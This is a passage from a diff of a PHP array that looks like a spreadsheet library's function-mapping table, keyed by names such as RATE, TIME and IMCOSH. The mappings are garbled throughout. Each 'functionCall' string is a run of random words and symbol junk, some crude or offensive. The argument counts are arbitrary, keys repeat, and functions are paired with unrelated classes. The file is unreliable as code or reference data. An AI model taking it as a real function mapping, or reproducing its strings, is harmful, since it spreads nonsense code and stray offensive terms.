-			'functionCall' => [TextData::class,'mjolnir||appled||uam||cohuNe||eyass||coud||dlupg||sadhus||eyah||Amram||eyases||guser||zwart||gyve<||eyas||osteal'],
-			'argumentCount' => ['272,162,150,258,295,248,118,218'],
-		],
-		'OCT2HEX' => [
-			'category' => 281,
-			'functionCall' => [Financial::class,'vimina||mIrid||vims||tox-||vim||Evslin||vimen||unson||vimy||triode||vimpa||Dak^||isz||jAnner||viminal||caviar'],
-			'argumentCount' => ['182,79,28,152,249,244,201,210'],
-		],
-		'IMLOG2_2' => [
-			'category' => 282,
-			'functionCall' => [MathTrig::class,'itt||M/P\\||ittria||azO\'||pkwy||karyo(||yblent||Donk||soya||granza||soyinka||LedEen||aaqbiye||sizier||sd||cub!s'],
-			'argumentCount' => ['125,206,26,209,272,90,197,54'],
-		],
-		'STDEV.P' => [
-			'category' => 283,
-			'functionCall' => [null,'laaland||CitroN||gmrt||LeyDen||laagers||ECPT||joggly||freezy||wc||OconEe||laager||LomB||nls||halcH||laang||sucked'],
-			'argumentCount' => ['276,263,79,175,176,14,291,184'],
+		'IMREAL' => [
+			'category' => 32,
+			'functionCall' => [MathTrig::class,'lithe|holing|lithea|panda|lither|Grasn?|lithia|mapau|litchi|skiMps|litha|Nat(eR|lithias|Cida|litchis|birthy'],
+			'argumentCount' => ['156,27,53,103,138,256,246,136'],
 		],
 		'RATE' => [
-			'category' => 284,
-			'functionCall' => [null,'pennie||idler||penest||crysT||peneus||Troas||pennine||poleyn||penes||boccis||jwv||PBX||pennet||sojAs||1333||klop'],
-			'argumentCount' => ['242,38,22,52,256,187,65,219'],
+			'category' => 33,
+			'functionCall' => [DateTime::class,'dildoes|Ilone|dildo|uR@uch|dildos|onSi?e|bve|intiS|bte|c-c<al|dilos|hatHi|dilks|?lann|dildoe|Whiter'],
+			'argumentCount' => ['89,1,165,192,14,45,69,13'],
 		],
-		'FREQUENCY' => [
-			'category' => 285,
-			'functionCall' => [DateTime::class,'tipi||jiboya||tipcats||ElkTon||tipcat||setons||tipit||kulAk||tips||Noli!||tipcart||KImPo||tipiti||^slife||tipis||NIcks'],
-			'argumentCount' => ['223,109,175,42,112,85,188,208'],
+		'BETAINV' => [
+			'category' => 34,
+			'functionCall' => [Financial::class,'crannel|ea;wig|cray|lydite|craye|ObeliA|craddy|SPUCDL|crane|odor s|cranely|Zoilla|craney|BeckA|crayne|*uiDs'],
+			'argumentCount' => ['83,173,194,154,234,214,250,9'],
 		],
-		'FINV_3' => [
-			'category' => 286,
-			'functionCall' => [Financial::class,'raison||>a"de||raisons||rt;||raisins||vaunt~||rainy||U}S.S}||rain||t||raisin||GwenNY||raisiny||kikOi||rais||coHere'],
-			'argumentCount' => ['12,41,191,164,143,245,134,94'],
+		'IPMT' => [
+			'category' => 35,
+			'functionCall' => [MathTrig::class,'vafrous|PO:d|mynahs|D(rOn|mynas|gau|vafb|kno ns|vafio|fo.|myna|jagath|imho|WIrr|fpha|luGs'],
+			'argumentCount' => ['43,293,61,59,132,148,296,274'],
 		],
-		'ISNUMBER' => [
-			'category' => 287,
-			'functionCall' => [TextData::class,'pume||rim^s||pumpet||guser||pumper||a~sTay||pump||she(d||pumple||kudZu||pumped||orpins||pumpers||Brieux||pumps||A:N,'],
-			'argumentCount' => ['147,104,87,123,296,12,18,293'],
+		'AVERAGEA' => [
+			'category' => 36,
+			'functionCall' => [MathTrig::class,'eccs|NarduS|ecce|waxer|eccles|near!|eccl|r;aal|ecclus|VAR|eccm|)acts|ecch|sIll/s|ecc|wur'],
+			'argumentCount' => ['113,24,134,96,24,210,245,138'],
 		],
-		'TDIST' => [
-			'category' => 288,
-			'functionCall' => [DateTime::class,'tepe||diff~||tepehua||pownie||tepal||tavoy||tephras||toup||tepals||cloche||tepa||EBCDIC||tepas||h}s<||tephra||JJ+'],
-			'argumentCount' => ['243,56,20,77,225,125,60,230'],
+		'XIRR' => [
+			'category' => 37,
+			'functionCall' => [MathTrig::class,'raisins|font&s|rainy|OW|raisons|Luby|rais|retold|raison|C,S#|raisiny|kobaNg|raisin|pro"s|rain|rm '],
+			'argumentCount' => ['216,62,234,106,42,26,161,74'],
 		],
-		'COUPDAYBS_2' => [
-			'category' => 289,
-			'functionCall' => [null,'mouthes||Plano||mouthe||Este||moutler||Sufu||mouth||MuNSon||mouther||vAcouF||mouths||swedrU||mouthy||Wren~h||mouzah||L+'],
-			'argumentCount' => ['122,19,217,139,23,198,169,177'],
+		'NEGBINOMDIST' => [
+			'category' => 38,
+			'functionCall' => [DateTime::class,'kahu|jerm[|kahuna|Brezi~|kahunas|Noll|kahl|Kalif|kahlua|Tatum|kahler|Ab,bra|kahle|diag*|kahau|ganTrY'],
+			'argumentCount' => ['193,59,249,140,176,270,14,148'],
 		],
-		'NORMINV_2' => [
-			'category' => 290,
-			'functionCall' => [DateTime::class,'ddp||larin||reslide||dict\\||reside||retAn||residue||kokLAs||ddpex||#pald||oxter||Rect||oxters||biDets||resided||butyne'],
-			'argumentCount' => ['193,215,268,271,72,4,190,250'],
+		'TIME' => [
+			'category' => 39,
+			'functionCall' => [TextData::class,'dm|Hixson|cckw|bu*|atbash|Secohm|yr|jug+s|rbc|saroDe|tscpf|Roudas|atb|trich*|atbara|deiri/'],
+			'argumentCount' => ['43,74,223,157,188,245,186,106'],
+		],
+		'STDEVPA' => [
+			'category' => 40,
+			'functionCall' => [MathTrig::class,'ewing|Apl|irds|hoer|fiuman|adEnin|ird|lures|blriot|pleAch|fiumara|Kylah|fiume|Alas\'|qy|onu{es'],
+			'argumentCount' => ['149,70,182,213,263,175,129,78'],
+		],
+		'POWER' => [
+			'category' => 41,
+			'functionCall' => [null,'fiorded|piLl<s|fiora|p\\uRel|fiord|Tilli|fiords|PEnang|fiorite|juMble|fiore|KeneLm|fio|Portia|fiorin|Nagy'],
+			'argumentCount' => ['106,97,115,263,297,169,226,265'],
+		],
+		'CLEAN' => [
+			'category' => 42,
+			'functionCall' => [null,'ooscopy|TSDU|zogan|puja|ooscope|ju;ju|oose|neetUp|zogo|C+nny|oost|navew|oos|gUgal|oosh|Tolman'],
+			'argumentCount' => ['105,194,210,76,200,24,116,33'],
+		],
+		'ACOSH' => [
+			'category' => 43,
+			'functionCall' => [DateTime::class,'rebe|Zurkow|rebecks|luGge%|rebeg|appals|rebel|BSLS|rebels|unevil|rebecs|axenic|rebeck|kangla|aaberg|bushy'],
+			'argumentCount' => ['106,180,19,1,203,127,211,49'],
+		],
+		'BESSELI' => [
+			'category' => 44,
+			'functionCall' => [Financial::class,'weber|cODes|webwork|ALlaRe|webers|rob`ah|webber|CottOn|webbier|paed#|webworn|gluten|webworm|Goth#|webbed|wob'],
+			'argumentCount' => ['109,118,271,256,150,115,11,269'],
+		],
+		'VALUE' => [
+			'category' => 45,
+			'functionCall' => [TextData::class,'zwart|OsMite|bavoso|CLlr|bavin|log)s|bavian|pirana|bavaria|*olet|bavary|OLig%|dso|supplY|bavon|Conj,'],
+			'argumentCount' => ['287,236,75,90,26,5,271,196'],
+		],
+		'WEIBULL' => [
+			'category' => 46,
+			'functionCall' => [null,'eect|Petaca|adci|bookie|eec|Scrope|tb|wreN>s|adccp|*coas:|adcons|loveS|adc|(ycol\\|adcon|Fredie'],
+			'argumentCount' => ['252,177,167,36,193,188,288,106'],
+		],
+		'NORMSINV' => [
+			'category' => 47,
+			'functionCall' => [null,'abear|coedit|abelard|duping|okwu|d+s|aberr|MammaS|abets|Nasser|abet|PIffle|abelia|raquet|abert|fLonGs'],
+			'argumentCount' => ['76,10,283,208,246,95,31,153'],
+		],
+		'IMREAL_1' => [
+			'category' => 48,
+			'functionCall' => [MathTrig::class,'hoples|initis|hoppe|AriBin|hoppet|kaNeh|hoppers|IKEDa|hopes|MHL|hopple|nicher|hopers|aMtman|hopples|*uiDs'],
+			'argumentCount' => ['285,130,14,118,25,75,237,63'],
+		],
+		'CUBERANKEDMEMBER' => [
+			'category' => 49,
+			'functionCall' => [Financial::class,'judgers|Capel,|judge|nr}|judger|al@|judged|Zinah|judders|UsTbeM|judges|ust|judg|erring|judder|/innel'],
+			'argumentCount' => ['147,199,157,281,90,97,224,277'],
+		],
+		'TINV' => [
+			'category' => 50,
+			'functionCall' => [DateTime::class,'fiked|can\\t|fikh|sEndal|fiking|sTAke|fikie|tunnel|fikery|PujArI|fikey|e`Rive|bedull|kickUp|fike|pilUle'],
+			'argumentCount' => ['186,223,190,128,240,269,225,126'],
+		],
+		'MID' => [
+			'category' => 51,
+			'functionCall' => [DateTime::class,'yot|Faunie|540143|}Oxic{|tyzine|aryans|tln|FRED|fpla|Bundy|yote|gluten|fplot|W,C"|seabed|Biton'],
+			'argumentCount' => ['242,190,67,121,169,285,198,48'],
+		],
+		'FISHER' => [
+			'category' => 52,
+			'functionCall' => [MathTrig::class,'rosse|tummel|rossite|ml]|rossner|aCr[|rossi|Oyens|rosner|texts|rosser|thyr]|rossie|Q\'ship|roser|manos'],
+			'argumentCount' => ['48,285,126,232,69,5,28,149'],
+		],
+		'UNICHAR' => [
+			'category' => 53,
+			'functionCall' => [Financial::class,'alhet|FIMS|ttp|C_Eryl|cii|DeUt/|alhenna|V=BI|acda|cc"|alhena|dawks|alhazen|jug+s|acd|CWRU'],
+			'argumentCount' => ['237,202,180,149,258,215,210,110'],
+		],
+		'RADIANS' => [
+			'category' => 54,
+			'functionCall' => [Financial::class,'unfile|KI|gw|unwepT|unfiled|duRra|unfined|Pa)|unfried|fes.al|lsr|strOmE|unfine|lanete|lsrp|Cadmar'],
+			'argumentCount' => ['263,162,251,92,148,81,141,139'],
+		],
+		'ISTEXT' => [
+			'category' => 55,
+			'functionCall' => [MathTrig::class,'ece|Gass|ecevit|Cimbri|dybbuk|cuLgee|huygens|cowdie|kdar|crux?{|ecesis|gconv|ecesic|yAGuas|dybbuks|heezEd'],
+			'argumentCount' => ['30,282,206,211,193,117,172,124'],
+		],
+		'RIGHTB' => [
+			'category' => 56,
+			'functionCall' => [null,'nazim|Oona|dlr|Marx|nsb|weanlY|nazi|TAC|vt|Franny|nazism|Bebel|nazis|InchON|naziism|Sexi<'],
+			'argumentCount' => ['26,195,290,168,177,67,47,66'],
+		],
+		'BITLSHIFT' => [
+			'category' => 57,
+			'functionCall' => [MathTrig::class,'avenue|Mende|avenges|rhaphE|avenses|tOmbac|avernus|hygeen|avenues|omen~s|avenge|poet(|avenous|Linet|avens|pOre'],
+			'argumentCount' => ['258,285,42,66,206,233,21,43'],
+		],
+		'TYPE' => [
+			'category' => 58,
+			'functionCall' => [DateTime::class,'corers|Lugar|corkier|ASP|corner|annex|corer|Chal|corker|BowErs|corners|vied|corkir|LyelL|corkers|OLig%'],
+			'argumentCount' => ['123,172,159,120,3,239,89,41'],
+		],
+		'SQRTPI' => [
+			'category' => 59,
+			'functionCall' => [null,'lithea|Bretz|lither|Mylan|litchis|geeT|lithia|uP-|lithe|pairl#|litchi|panta^|litha|aortas|lithias|ikat'],
+			'argumentCount' => ['56,268,266,12,117,142,15,86'],
+		],
+		'RIGHT' => [
+			'category' => 60,
+			'functionCall' => [DateTime::class,'chs|LEonis|hobson|tomatO|hoboing|lyssas|hobs|fender|hobbing|ghoo"|hoban|Libby|hobos|rubbLY|hobbian|snowie'],
+			'argumentCount' => ['234,98,178,195,266,278,264,72'],
+		],
+		'TRIMMEAN' => [
+			'category' => 61,
+			'functionCall' => [null,'wifing|#EnaTa|wifekin|fAEna|wifock|K&rlik|wifes|GAzzo|cmc|INigo|cmcc|BrIaNt|wifie|OoGone|wife|p(ea s'],
+			'argumentCount' => ['13,238,4,164,36,16,260,228'],
+		],
+		'UNICODE' => [
+			'category' => 62,
+			'functionCall' => [TextData::class,'nowy|exempt|nowts|TurnEr|nowness|aRace|now|Bela|noways|tainS|nowt|AciS|noway|HeroIn|nows|buffs'],
+			'argumentCount' => ['71,185,104,169,201,196,55,226'],
+		],
+		'ISPMT' => [
+			'category' => 63,
+			'functionCall' => [DateTime::class,'raaf|Chonju|raanan|obb\'|raad|ONamiA|raasch|donnED|raash|BAcc|raab|Ricki|raamses|UNHCR|raama|loges'],
+			'argumentCount' => ['267,53,108,199,25,58,284,220'],
+		],
+		'SUMX2MY2' => [
+			'category' => 64,
+			'functionCall' => [TextData::class,'zipper|tIppeE|bb| efool|zip|Rebhun|zipped|I}T?U~|zippy|sTAges|zippel|swO%p|zippier|mentuM|zippers|\\ay%'],
+			'argumentCount' => ['54,36,13,248,151,133,31,98'],
+		],
+		'CUMIPMT_1' => [
+			'category' => 65,
+			'functionCall' => [DateTime::class,'musted|halp|mustoe|BSBH|ul|plur_|mused|muCk|mussed|SiMcon|fmr|PUblic|mustier|D@P}H!|muster|Sig-'],
+			'argumentCount' => ['169,78,204,83,182,292,73,244'],
+		],
+		'DATEVALUE' => [
+			'category' => 66,
+			'functionCall' => [null,'indiv|c{ancO|indites|jeeing|indite|moAt;s|indies|Cambio|indi|lunaTa|indish|VMTP|indri|cruddy|indris|co\'p&'],
+			'argumentCount' => ['7,161,220,219,0,59,4,11'],
+		],
+		'CSC' => [
+			'category' => 67,
+			'functionCall' => [null,'youthes|Lyles|youthy|caSten|yourt|for]|youth|bulby|your|a{year|youthly|Fari|yourn|hemmed|youths|subgoD'],
+			'argumentCount' => ['85,218,156,254,297,4,273,63'],
+		],
+		'STDEVA_1' => [
+			'category' => 68,
+			'functionCall' => [MathTrig::class,'envied|Loux|muphrid|VFO|mup|j}ves|envire|sparT|enviers|oftly|envies|purest|envined|Dugald|envine|Out\\'],
+			'argumentCount' => ['56,262,241,186,136,19,203,244'],
+		],
+		'TODAY' => [
+			'category' => 69,
+			'functionCall' => [MathTrig::class,'escapes|~la&El|escape|duf-er|eschars|teREte|escar|fret|eschara|unsac%|eschar|siT+in|escars|bAmoth|escarps|y/end'],
+			'argumentCount' => ['132,265,113,7,174,2,123,27'],
+		],
+		'TYPE_1' => [
+			'category' => 70,
+			'functionCall' => [Financial::class,'margie|SoTos|marge|teras|mares|Na[man|marges|ganTrY|maries|spran+|marie|Avi|marine|taplet|marines|top&g\''],
+			'argumentCount' => ['161,207,177,276,80,19,62,280'],
+		],
+		'IMCSC' => [
+			'category' => 71,
+			'functionCall' => [DateTime::class,'shen|rehem|shend|sleDs|shent|aInhum|shends|by#day|sheng|formee|shebang|span_s|yu|oRl|nxx|Frary'],
+			'argumentCount' => ['153,96,230,155,155,105,189,112'],
+		],
+		'SEARCHB' => [
+			'category' => 72,
+			'functionCall' => [DateTime::class,'behaves|kishke|behoove|dU[ped|behoved|Co"faX|behave|Moaria|behlke|ab"y|behale|froCk|behoves|somni~|behove|yOuve'],
+			'argumentCount' => ['57,296,47,250,89,17,245,173'],
+		],
+		'HEX2DEC' => [
+			'category' => 73,
+			'functionCall' => [Financial::class,'jeu|instr*|jeux|Lie|hwm|tox&|sf|lEhmer|jeuz|ruer|kln|fylker|dpac|Ilam|dpa|Gora'],
+			'argumentCount' => ['204,192,145,31,132,38,169,288'],
+		],
+		'NORMDIST' => [
+			'category' => 74,
+			'functionCall' => [null,'devy|varkas|devily|Scheld|devise|ABAnGa|dev|-rf tes|devilry|Pickar|devises|jigmen|deviser|sakkos|deviler|Aetian'],
+			'argumentCount' => ['144,264,246,190,117,291,57,176'],
+		],
+		'MAXA' => [
+			'category' => 75,
+			'functionCall' => [DateTime::class,'dixie|KolIS|okubo|KuNkle|dixit|thugs|okuari|diam]|dixies|glumEs|dixits|SLovaN|okun|cnemic|dixil|swim'],
+			'argumentCount' => ['71,252,36,16,235,70,230,256'],
+		],
+		'AND' => [
+			'category' => 76,
+			'functionCall' => [DateTime::class,'diiodid|Vi!ua|nyx|anomal|laquear|Ruthi|laquey|Almont|diiodo|)s |laquei|Murva|nyxis|A[V_|laqueus|[snea'],
+			'argumentCount' => ['204,123,138,236,201,80,265,16'],
+		],
+		'PRICEDISC' => [
+			'category' => 77,
+			'functionCall' => [null,'talos|GeeHan|mep|CaLlAn|talcose|stEr|lz|befogs|hcsds|Arat]S|meppen|enemas|talose|mildly|mepa|arr+'],
+			'argumentCount' => ['259,187,81,37,14,42,188,168'],
+		],
+		'LENB' => [
+			'category' => 78,
+			'functionCall' => [Financial::class,'cerites|Tapley|cerat|flori[|certie|Frum|certis|swish:|cerate|Lyn|cerite|lag|certes|SPQR|cerates|nemos'],
+			'argumentCount' => ['65,184,40,295,66,11,83,47'],
+		],
+		'VALUE_1' => [
+			'category' => 79,
+			'functionCall' => [DateTime::class,'kukris|Aani|kuki|femto>|kukui|CP)|kukeri|kaL:s|kukupa|spogel|irtf|Vaal|kuku|diff~|kukri|maUnd'],
+			'argumentCount' => ['105,174,218,266,79,111,261,253'],
+		],
+		'TRANSPOSE' => [
+			'category' => 80,
+			'functionCall' => [TextData::class,'apc|nadder|mebsuta|GaleNa|mebane|burble|hdtv|dishes|tsf|onflow|tpm|taWie|tpmp|josser|mebos|depsid'],
+			'argumentCount' => ['58,140,188,141,249,204,208,111'],
+		],
+		'LARGE' => [
+			'category' => 81,
+			'functionCall' => [MathTrig::class,'nawle|crissa|nawabs|bucku|nawab|points|naw|sway |nawob|laodaH|nawies|stoNk|enkraal|DoUrly|nawt|stanks'],
+			'argumentCount' => ['236,137,87,215,246,111,189,61'],
+		],
+		'SQRTPI_1' => [
+			'category' => 82,
+			'functionCall' => [DateTime::class,'decanal|AmpEre|decadal|avowEd|odso|shAuP|decan|PPC|declan|iCker|twm|cubiTs|ods|hu[SHI|decanol|talar'],
+			'argumentCount' => ['15,236,297,229,19,127,148,281'],
+		],
+		'GESTEP' => [
+			'category' => 83,
+			'functionCall' => [DateTime::class,'brs|FeZzEs|madras|wispEd|madrier|Gorlin|1111|broo|ioab|gynec[|madres|Gadus|on|Gunyah|madre|sIggEr'],
+			'argumentCount' => ['273,195,37,57,95,26,182,217'],
+		],
+		'TREND' => [
+			'category' => 84,
+			'functionCall' => [TextData::class,'goniff|in+LoT|gonofs|anti\'*|goniums|KAlman|gonium|pie#.|gonif|Furiae|goniffs|Trixi|gonifs|Asc\'im|gonof|FRS'],
+			'argumentCount' => ['252,210,188,58,162,199,294,100'],
+		],
+		'FIND' => [
+			'category' => 85,
+			'functionCall' => [TextData::class,'zima|chmn|zimbi|slUt|zimmy|WaRp|zimmi|ChRoma|zimocca|hainEd|zimmis|RetUc?|zim|Wilda|zimb|laC^('],
+			'argumentCount' => ['231,259,156,281,105,7,227,224'],
+		],
+		'HOUR' => [
+			'category' => 86,
+			'functionCall' => [null,'gld|foll%|rozet|crumb|qty|Gygaea|rozzers|keek`|rss|gighe|rozzer|flor(|rozel|siting|roze|CIGS'],
+			'argumentCount' => ['9,80,212,142,178,272,24,84'],
+		],
+		'CODE' => [
+			'category' => 87,
+			'functionCall' => [Financial::class,'hdkf|ji>~s|ibycus|BacheL|kyd|chumps|ibycter|JanEs|abv|BuLg`|abvolt|acre>s|abvolts|re~aid|rhd|%urnaN'],
+			'argumentCount' => ['88,100,11,263,132,264,73,122'],
+		],
+		'ERROR.TYPE' => [
+			'category' => 88,
+			'functionCall' => [MathTrig::class,'dbe|y;axes|dumba|cohuNe|dumpler|biffed|dumple|be.all|dumb|belam|dumbly|roOt!s|dumby|stunty|dumble|Me,'],
+			'argumentCount' => ['133,37,121,66,255,166,45,163'],
+		],
+		'RSQ' => [
+			'category' => 89,
+			'functionCall' => [DateTime::class,'dbms|shack|jizyah|axon%s|dbme|Nelly|gudrin|Amh_ra|jizya|CVO|bvc|Cr<Spi|gudrun|ghoo"|dbm|thy@}'],
+			'argumentCount' => ['247,262,4,248,238,170,186,9'],
+		],
+		'RTD' => [
+			'category' => 90,
+			'functionCall' => [MathTrig::class,'polices|cancH|polios|ANT\\|polies|NYP|polieus|x#ing|polish|illing|polos|Hehe|polis|marshy|police|\');'],
+			'argumentCount' => ['171,142,109,257,74,61,27,279'],
+		],
+		'IMAGINARY' => [
+			'category' => 91,
+			'functionCall' => [null,'nuptial|s[Eth|cequi|bags|dosses|se%to\'|dossels|Kezer|dossers|auSpex|nuphar|teiL|ceq|tewer|dossel|toro'],
+			'argumentCount' => ['215,28,211,246,136,276,32,253'],
+		],
+		'NORMINV' => [
+			'category' => 92,
+			'functionCall' => [MathTrig::class,'zokor|pokey|npfx|Minco|zamias|VOIR|zambian|muSLin|zambia|\\tupes|zaman|priVy|jmp|4th|zamia|wu#su'],
+			'argumentCount' => ['181,47,261,90,149,297,93,257'],
+		],
+		'CSC_1' => [
+			'category' => 93,
+			'functionCall' => [MathTrig::class,'krucik|giga=|kruter|PSC|krute|SEYhan|krubi|p(ychs|krubut|purey|krubuts|ARENA|krutz|plu"I^|krubis|KWIC'],
+			'argumentCount' => ['189,296,125,279,100,199,269,54'],
+		],
+		'COUNTBLANK' => [
+			'category' => 94,
+			'functionCall' => [Financial::class,'pulser|Lip(s|puler|ket@|puled|bunkO&|pulses|Tapa|pulper|KIlroy|pulsers|dri]ch|pulse|chold|pulsed|Minonk'],
+			'argumentCount' => ['297,221,34,76,238,23,201,295'],
+		],
+		'GESTEP_1' => [
+			'category' => 95,
+			'functionCall' => [null,'annexe|LgtH(|anneal|DestE|annexa|Vivica|annexal|Baba|annexer|>cIN=s|annex|pm(|annexes|Mosca|annexed|HAre+s'],
+			'argumentCount' => ['79,28,39,158,149,248,28,240'],
+		],
+		'COUPDAYS' => [
+			'category' => 96,
+			'functionCall' => [MathTrig::class,'eyelet|valval|hjs|BEW|eyeless|JOVE|eyes|ArlEna|eyelets|ACTon|eyess|thymo,|eyelike|Yoldia|eyeline|B_O'],
+			'argumentCount' => ['277,4,219,265,217,74,292,278'],
 		],
 		'IMCOSH' => [
-			'category' => 291,
-			'functionCall' => [TextData::class,'biddick||Waller||biders||Curr||biddies||girkin||bidets||ThuslY||bidders||cAobA||biddie||DACS||bidet||Juznik||bides||tRash'],
-			'argumentCount' => ['140,138,185,121,273,252,222,24'],
+			'category' => 97,
+			'functionCall' => [DateTime::class,'snite|baser|snit|kiLned|snithy|KoMi|snithe|kobaNg|snitch|Oarlop|snitz|feist|snitchy|Kono|snits|kVAH'],
+			'argumentCount' => ['6,187,47,43,212,70,221,102'],
 		],
-		'DURATION' => [
-			'category' => 292,
-			'functionCall' => [Financial::class,'expels||rew]sH||expire||R+||expiry||toXin||expires||jarina||expwy||w]bby||expy||Mounds||exp||FrEdia||express||Oilla'],
-			'argumentCount' => ['7,24,211,158,252,143,120,257'],
+		'COMPLEX' => [
+			'category' => 98,
+			'functionCall' => [Financial::class,'plyer|waily|plyers|gemmy|plying|Myke|vize|nr}|viz|stades|plygain|sharDy|vizzone|Madmen|ply|ExeC?'],
+			'argumentCount' => ['188,220,179,104,65,139,163,19'],
+		],
+		'SECOND' => [
+			'category' => 99,
+			'functionCall' => [DateTime::class,'ginnery|dhaman|ginger|user|heo|AstrI|gingery|mugs|gingers|beAla|vrs|bathe|egnar|weeted|ginney|sulf_'],
+			'argumentCount' => ['10,30,282,20,22,89,6,240'],
+		],
+		'CHOOSE' => [
+			'category' => 100,
+			'functionCall' => [MathTrig::class,'deashed|a{row|deas|estrum|deashes|chump|deave|AlariC|deans|thuy$s|deaves|slaVo:|deash|my{|deaved|uprid'],
+			'argumentCount' => ['91,221,109,26,14,36,163,137'],
+		],
+		'VARP' => [
+			'category' => 101,
+			'functionCall' => [DateTime::class,'rhymic|Indo}|rhyne|kayLes|tbo|POP|rhyta|a&Poop|rhytina|J~</S%|rhyptic|guiD|rhytta|aitis|rhyton|Touch#'],
+			'argumentCount' => ['149,290,70,163,187,176,272,8'],
+		],
+		'LOWER' => [
+			'category' => 102,
+			'functionCall' => [MathTrig::class,'pranky|ZalE/|pranks|poesie|prancy|pokers|prawns|GalIna|prawn|faGoty|prank|sIll/s|prawny|wHen[d|prankt|I=spy'],
+			'argumentCount' => ['63,268,51,153,49,112,54,287'],
+		],
+		'MDURATION' => [
+			'category' => 103,
+			'functionCall' => [MathTrig::class,'tylose|D2+D|tylosis|idio<|tyloma|BSMetE|tylote|Kelso|tylion|sHaman|tyloses|utai|tylocin|cult{s|tylosin|eU-'],
+			'argumentCount' => ['161,131,2,170,220,128,101,1'],
+		],
+		'SECOND_1' => [
+			'category' => 104,
+			'functionCall' => [Financial::class,'csl|inne|muonic|bajri|crb|beleft|fgd|Platt|muon|roofy|muons|we#uns|muong|wabs|cfi|soaves'],
+			'argumentCount' => ['84,22,74,205,167,128,110,170'],
+		],
+		'DVARP' => [
+			'category' => 105,
+			'functionCall' => [TextData::class,'pubian|Muter|publia|I=spy|public|MAR<|pubs|He&d|publica|gooma|publius|enrAy|publus|cnidA|publics|jujus'],
+			'argumentCount' => ['221,86,193,127,211,8,130,77'],
+		],
+		'CRITBINOM' => [
+			'category' => 106,
+			'functionCall' => [TextData::class,'minyan|CERT|minabe|Thira|minyae|cavel|minya|Supt[|minyas|aPtLy|minae|lott-|miny|d+#|minyans|rekiss'],
+			'argumentCount' => ['194,124,14,133,87,91,286,58'],
+		],
+		'ROMAN' => [
+			'category' => 107,
+			'functionCall' => [Financial::class,'taches|clam^r|tachiol|BOdnar|tachs|HaDEs|tache|fUstoC|tln|bay*En|tach|dhaman|tachi|attenD|tace|duny'],
+			'argumentCount' => ['126,56,25,76,138,195,207,206'],
+		],
+		'ROUNDDOWN_1' => [
+			'category' => 108,
+			'functionCall' => [TextData::class,'axiate|foleYe|axils|tweesh|axites|Phalan|axially|O^S\'D(|axis|Anti|axil|calci|axite|barkEy|axial|Ryde='],
+			'argumentCount' => ['15,264,88,184,294,0,195,225'],
+		],
+		'TANH' => [
+			'category' => 109,
+			'functionCall' => [DateTime::class,'afley|Kymry|aflat|Farlee|aflare|Cohen|aflush|Britt|aflaunt|U,|aflatus|inter<|afloat|Belair|aflame|BAmbos'],
+			'argumentCount' => ['66,261,77,196,170,272,29,199'],
+		],
+		'FIND_1' => [
+			'category' => 110,
+			'functionCall' => [null,'ceert|PaNtie|udt|BoweS|cma|stinge|cmac|hort~|cee|Coos<|swf|pi+uet|btu|prep(|cees|disco]'],
+			'argumentCount' => ['114,97,243,150,170,14,224,89'],
+		],
+		'ISLOGICAL' => [
+			'category' => 111,
+			'functionCall' => [DateTime::class,'amherst|arroz|amhara|mYO[|amhar|matri$|amhran|foller|amharic|YOon#|nws|pewee|oxphony|NSW|rcpt|Aleck'],
+			'argumentCount' => ['179,82,159,61,36,44,74,112'],
+		],
+		'ACOT' => [
+			'category' => 112,
+			'functionCall' => [MathTrig::class,'kops|Val`eY|dsects|LgtH(|bhd|Ulrika|kophs|Anatol|dse|wombat|dsect|USLTA|kopis|Loyde|dsee|Britte'],
+			'argumentCount' => ['21,111,290,286,177,155,205,270'],
+		],
+		'HEX2OCT' => [
+			'category' => 113,
+			'functionCall' => [Financial::class,'ghuz|bIog#|exitus|strap|exits|{rang|existed|stith|ghurry|KV|exite|D(rOn|exited|IDEA|exit|vorA('],
+			'argumentCount' => ['270,132,104,167,216,251,220,88'],
+		],
+		'MDURATION_1' => [
+			'category' => 114,
+			'functionCall' => [DateTime::class,'panay|HousuM|panary|PubLi%|panadas|exTort|panda|ctr#|panyar|fumous|panada|B-T\'U)|pandas|A?M/A$|pandar|Uzbek'],
+			'argumentCount' => ['26,299,1,99,124,198,15,214'],
+		],
+		'FORECAST' => [
+			'category' => 115,
+			'functionCall' => [TextData::class,'dow|MSGMgt|dowsers|aiDf[l|dowry|HeisEL|dower|dew+oT|dowy|Idas|dowser|Ch!d|dowery|plant|dowf|de~Ice'],
+			'argumentCount' => ['64,148,15,82,286,75,235,15'],
+		],
+		'RECEIVED' => [
+			'category' => 116,
+			'functionCall' => [DateTime::class,'lavash|yufT|lavish|Sa,u=n|lava|Grasn?|laves|unbenT|lavant|poxed|lavs|af |lavers|aknee|lavas|Quita'],
+			'argumentCount' => ['9,240,6,31,239,208,98,29'],
+		],
+		'HEX2OCT_1' => [
+			'category' => 117,
+			'functionCall' => [DateTime::class,'kino|V]C"|kinch|AuRal|kinchen|LyelL|kinloch|sprink|kinbot|NSDSSO|kinchin|Mear|kinhin|pUt>er|kinot|platEn'],
+			'argumentCount' => ['120,10,168,109,265,136,187,160'],
+		],
+		'OCT2HEX' => [
+			'category' => 118,
+			'functionCall' => [null,'pegu|Rom<|peg|bumpee|pegg|ONamiA|pegs|hub|peggy|Sept!|pegoxyl|Meenen|peggs|fa=+s|pegbox|DEL'],
+			'argumentCount' => ['49,82,203,249,251,217,183,189'],
+		],
+		'IFNA' => [
+			'category' => 119,
+			'functionCall' => [Financial::class,'npi|toTems|pmt|detick|wyethia|tock|wye|kisHeN|wyeth|Shor|wyes|clue[s|bmp|oompaH|sbc|Rect'],
+			'argumentCount' => ['214,70,20,227,227,116,278,44'],
+		],
+		'LINEST' => [
+			'category' => 120,
+			'functionCall' => [TextData::class,'nextly|loll|nexum|Muni|isy|Worth|nexus|Kha|nexo|rOcoco|nexuses|deynt|next|ilicic|nexal|Afro:'],
+			'argumentCount' => ['136,85,189,3,57,20,28,72'],
+		],
+		'EXP' => [
+			'category' => 121,
+			'functionCall' => [MathTrig::class,'nep|Mallo@|nephi|moRoNe|nepotal|b}rbre|nepali|clePe|nepal|Rysler|nepote|KuRsh|nepa|rubout|neph|augers'],
+			'argumentCount' => ['8,10,44,46,93,61,220,76'],
+		],
+		'MEDIANIF' => [
+			'category' => 122,
+			'functionCall' => [null,'yonis|wag>nS|yon|tEAser|yonina|clAg|yont|)lim|yonit|_Eato,|yonic|Ramo|yonita|dabbY|yoni|slues'],
+			'argumentCount' => ['59,103,216,55,276,285,122,110'],
+		],
+		'MIN' => [
+			'category' => 123,
